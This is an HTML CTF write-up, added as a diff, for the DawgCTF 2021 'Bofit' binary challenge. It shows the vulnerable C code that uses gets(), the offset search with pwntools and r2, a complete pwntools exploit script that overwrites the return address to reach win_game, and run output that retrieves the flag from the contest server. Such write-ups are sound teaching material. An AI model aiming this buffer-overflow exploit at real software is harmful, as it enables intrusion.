@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Bofit</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Bofit</h1>
+</header>
+<p>The game random generates an action amond <em>BOF</em>, <em>pull</em>, <em>twist</em> and <em>shout</em>. The first three actions use <em>getchar</em> to take user input, whilst the last one uses <em>gets</em> without limitation, so it read until ‘\0’. To win overflow <em>input</em>, then get to target <em>win_game</em>, which prints <em>flat.txt</em>.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1"></a><span class="dt">void</span> win_game(){</span>
+<span id="cb1-2"><a href="#cb1-2"></a>    <span class="dt">char</span> buf[<span class="dv">100</span>];</span>
+<span id="cb1-3"><a href="#cb1-3"></a>    <span class="dt">FILE</span>* fptr = fopen(<span class="st">&quot;flag.txt&quot;</span>, <span class="st">&quot;r&quot;</span>);</span>
+<span id="cb1-4"><a href="#cb1-4"></a>    fgets(buf, <span class="dv">100</span>, fptr);</span>
+<span id="cb1-5"><a href="#cb1-5"></a>    printf(<span class="st">&quot;%s&quot;</span>, buf);</span>
+<span id="cb1-6"><a href="#cb1-6"></a>}</span>
+<span id="cb1-7"><a href="#cb1-7"></a></span>
+<span id="cb1-8"><a href="#cb1-8"></a><span class="dt">int</span> play_game(){</span>
+<span id="cb1-9"><a href="#cb1-9"></a>    CHAR C;</span>
+<span id="cb1-10"><a href="#cb1-10"></a>    <span class="dt">char</span> input[<span class="dv">20</span>];</span>
+<span id="cb1-11"><a href="#cb1-11"></a>    <span class="dt">int</span> choice;</span>
+<span id="cb1-12"><a href="#cb1-12"></a>    <span class="dt">bool</span> correct = true;</span>
+<span id="cb1-13"><a href="#cb1-13"></a>    <span class="dt">int</span> score = <span class="dv">0</span>;</span>
+<span id="cb1-14"><a href="#cb1-14"></a>    srand(time(<span class="dv">0</span>));</span>
+<span id="cb1-15"><a href="#cb1-15"></a>    <span class="cf">while</span>(correct){</span>
+<span id="cb1-16"><a href="#cb1-16"></a>        choice = rand() % <span class="dv">4</span>;</span>
+<span id="cb1-17"><a href="#cb1-17"></a>        <span class="cf">switch</span>(choice){</span>
+<span id="cb1-18"><a href="#cb1-18"></a>            <span class="cf">case</span> <span class="dv">0</span>:</span>
+<span id="cb1-19"><a href="#cb1-19"></a>                printf(<span class="st">&quot;BOF it!</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
+<span id="cb1-20"><a href="#cb1-20"></a>                c = getchar();</span>
+<span id="cb1-21"><a href="#cb1-21"></a>                <span class="cf">if</span>(c != <span class="ch">&#39;B&#39;</span>) correct = false;</span>
+<span id="cb1-22"><a href="#cb1-22"></a>                <span class="cf">while</span>((c = getchar()) != <span class="ch">&#39;\n&#39;</span> &amp;&amp; c != EOF);</span>
+<span id="cb1-23"><a href="#cb1-23"></a>                <span class="cf">break</span>;</span>
+<span id="cb1-24"><a href="#cb1-24"></a></span>
+<span id="cb1-25"><a href="#cb1-25"></a>            <span class="cf">case</span> <span class="dv">1</span>:</span>
+<span id="cb1-26"><a href="#cb1-26"></a>                printf(<span class="st">&quot;Pull it!</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
+<span id="cb1-27"><a href="#cb1-27"></a>                c = getchar();</span>
+<span id="cb1-28"><a href="#cb1-28"></a>                <span class="cf">if</span>(c != <span class="ch">&#39;P&#39;</span>) correct = false;</span>
+<span id="cb1-29"><a href="#cb1-29"></a>                <span class="cf">while</span>((c = getchar()) != <span class="ch">&#39;\n&#39;</span> &amp;&amp; c != EOF);</span>
+<span id="cb1-30"><a href="#cb1-30"></a>                <span class="cf">break</span>;</span>
+<span id="cb1-31"><a href="#cb1-31"></a></span>
+<span id="cb1-32"><a href="#cb1-32"></a>            <span class="cf">case</span> <span class="dv">2</span>:</span>
+<span id="cb1-33"><a href="#cb1-33"></a>                printf(<span class="st">&quot;Twist it!</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
+<span id="cb1-34"><a href="#cb1-34"></a>                c = getchar();</span>
+<span id="cb1-35"><a href="#cb1-35"></a>                <span class="cf">if</span>(c != <span class="ch">&#39;T&#39;</span>) correct = false;</span>
+<span id="cb1-36"><a href="#cb1-36"></a>                <span class="cf">while</span>((c = getchar()) != <span class="ch">&#39;\n&#39;</span> &amp;&amp; c != EOF);</span>
+<span id="cb1-37"><a href="#cb1-37"></a>                <span class="cf">break</span>;</span>
+<span id="cb1-38"><a href="#cb1-38"></a></span>
+<span id="cb1-39"><a href="#cb1-39"></a>            <span class="cf">case</span> <span class="dv">3</span>:</span>
+<span id="cb1-40"><a href="#cb1-40"></a>                printf(<span class="st">&quot;Shout it!</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
+<span id="cb1-41"><a href="#cb1-41"></a>                gets(input);</span>
+<span id="cb1-42"><a href="#cb1-42"></a>                <span class="cf">if</span>(strlen(input) &lt; <span class="dv">10</span>) correct = false;</span>
+<span id="cb1-43"><a href="#cb1-43"></a>                <span class="cf">break</span>;</span>
+<span id="cb1-44"><a href="#cb1-44"></a>        }</span>
+<span id="cb1-45"><a href="#cb1-45"></a>        score++;</span>
+<span id="cb1-46"><a href="#cb1-46"></a>    }</span>
+<span id="cb1-47"><a href="#cb1-47"></a>    <span class="cf">return</span> score;</span>
+<span id="cb1-48"><a href="#cb1-48"></a>}</span></code></pre></div>
+<p>The padding can be found with <em>pwn.cyclic</em>, debug it with <em>r2</em>, input a 60 bytes cyclic string to overflow <em>input</em>, search address in <em>rip</em> with <em>pwn.cyclic_find</em> to get padding, which was 56 in this case. Tested several times the overflow happened at the next non-shout action after <em>shout</em>.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1"></a>[<span class="ex">0x7f5f8217b110</span>]<span class="op">&gt;</span> dc</span>
+<span id="cb2-2"><a href="#cb2-2"></a><span class="ex">Welcome</span> to BOF it! The game featuring 4 hilarious commands to keep players on their toes</span>
+<span id="cb2-3"><a href="#cb2-3"></a><span class="ex">You</span><span class="st">&#39;ll have a second to respond to a series of commands</span></span>
+<span id="cb2-4"><a href="#cb2-4"></a><span class="st">BOF it: Reply with a capital &#39;</span>B<span class="st">&#39;</span></span>
+<span id="cb2-5"><a href="#cb2-5"></a><span class="st">Pull it: Reply with a capital &#39;</span>P<span class="st">&#39;</span></span>
+<span id="cb2-6"><a href="#cb2-6"></a><span class="st">Twist it: Reply with a capital &#39;</span>T<span class="st">&#39;</span></span>
+<span id="cb2-7"><a href="#cb2-7"></a><span class="st">Shout it: Reply with a string of at least 10 characters</span></span>
+<span id="cb2-8"><a href="#cb2-8"></a><span class="st">BOF it to start!</span></span>
+<span id="cb2-9"><a href="#cb2-9"></a><span class="st">BOF</span></span>
+<span id="cb2-10"><a href="#cb2-10"></a><span class="st">Shout it!</span></span>
+<span id="cb2-11"><a href="#cb2-11"></a><span class="st">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa</span></span>
+<span id="cb2-12"><a href="#cb2-12"></a><span class="st">Twist it!</span></span>
+<span id="cb2-13"><a href="#cb2-13"></a><span class="st">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa</span></span>
+<span id="cb2-14"><a href="#cb2-14"></a><span class="st">[+] SIGNAL 11 errno=0 addr=0x6161616f code=1 si_pid=1633771887 ret=0</span></span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1"></a><span class="op">&gt;&gt;&gt;</span> pwn.cyclic(<span class="dv">60</span>)</span>
+<span id="cb3-2"><a href="#cb3-2"></a>b<span class="st">&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa&#39;</span></span>
+<span id="cb3-3"><a href="#cb3-3"></a><span class="op">&gt;&gt;&gt;</span> pwn.cyclic_find(<span class="bn">0x6161616f</span>)</span>
+<span id="cb3-4"><a href="#cb3-4"></a><span class="dv">56</span></span></code></pre></div>
+<p>Exploited as follow.</p>
+<pre><code>def exploit(remote):
+    if remote:
+        pr = pwn.connect(host, port)
+    else:
+        pr = pwn.process(target)
+
+    try:
+        elf = pwn.ELF(target)
+        print(&#39;win_game @&#39;, hex(elf.sym[&#39;win_game&#39;]))
+        pr.sendlineafter(&#39;BOF it to start!\n&#39;, &#39;BOF&#39;)
+
+        payload = b&#39;A&#39;*56
+        payload += pwn.p64(elf.sym[&#39;win_game&#39;])
+        shouted = False
+        print(payload)
+
+        while True:
+            cmd = pr.readline()
+            print(cmd)
+            if b&quot;Twist&quot; in cmd:
+                if shouted:
+                    pr.send(payload)
+                    pr.sendline()
+                    print(pr.readall(2))
+                else:
+                    pr.sendline(&#39;T&#39;)
+            elif b&quot;Pull&quot; in cmd:
+                if shouted:
+                    pr.send(payload)
+                    pr.sendline()
+                    print(pr.readall(2))
+                else:
+                    pr.sendline(&#39;P&#39;)
+            elif b&quot;BOF&quot; in cmd:
+                if shouted:
+                    pr.send(payload)
+                    pr.sendline()
+                    print(pr.readall(2))
+                else:
+                    pr.sendline(&#39;B&#39;)
+            elif b&quot;Shout&quot; in cmd:
+                pr.send(payload)
+                pr.sendline()
+                shouted = True
+    finally:
+        pr.close()
+exploit(True)</code></pre>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1"></a>$ <span class="ex">py3</span> explit.py                                                      </span>
+<span id="cb5-2"><a href="#cb5-2"></a>[<span class="ex">+</span>] Opening connection to umbccd.io on port 4100: Done                                                                                                                  </span>
+<span id="cb5-3"><a href="#cb5-3"></a>[<span class="ex">*</span>] <span class="st">&#39;/home/zex/lab_ex/hacking-lab/dawgctf-2021/bofit/bofit&#39;</span></span>
+<span id="cb5-4"><a href="#cb5-4"></a>    <span class="ex">Arch</span>:     amd64-64-little                                                                                                                                           </span>
+<span id="cb5-5"><a href="#cb5-5"></a>    <span class="ex">RELRO</span>:    Partial RELRO                                                         </span>
+<span id="cb5-6"><a href="#cb5-6"></a>    <span class="ex">Stack</span>:    No canary found                                                                                                                                           </span>
+<span id="cb5-7"><a href="#cb5-7"></a>    <span class="ex">NX</span>:       NX disabled                                                           </span>
+<span id="cb5-8"><a href="#cb5-8"></a>    <span class="ex">PIE</span>:      No PIE (0x400000)                                                                                                                                         </span>
+<span id="cb5-9"><a href="#cb5-9"></a>    <span class="ex">RWX</span>:      Has RWX segments</span>
+<span id="cb5-10"><a href="#cb5-10"></a><span class="ex">win_game</span> @ 0x401256</span>
+<span id="cb5-11"><a href="#cb5-11"></a><span class="ex">b</span><span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV\x12@\x00\x00\x00\x00\x00&#39;</span></span>
+<span id="cb5-12"><a href="#cb5-12"></a><span class="ex">b</span><span class="st">&#39;BOF it!\n&#39;</span>             </span>
+<span id="cb5-13"><a href="#cb5-13"></a><span class="ex">b</span><span class="st">&#39;Shout it!\n&#39;</span>                </span>
+<span id="cb5-14"><a href="#cb5-14"></a><span class="ex">b</span><span class="st">&#39;Shout it!\n&#39;</span>    </span>
+<span id="cb5-15"><a href="#cb5-15"></a><span class="ex">b</span><span class="st">&#39;Twist it!\n&#39;</span></span>
+<span id="cb5-16"><a href="#cb5-16"></a>[<span class="ex">+</span>] Receiving all data: Done (26B)</span>
+<span id="cb5-17"><a href="#cb5-17"></a>[<span class="ex">*</span>] Closed connection to umbccd.io port 4100</span>
+<span id="cb5-18"><a href="#cb5-18"></a><span class="ex">b</span><span class="st">&#39;DawgCTF{n3w_h1gh_sc0r3!!}\n&#39;</span></span>
+<span id="cb5-19"><a href="#cb5-19"></a><span class="ex">Traceback</span> (most recent call last)<span class="bu">:</span></span></code></pre></div>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
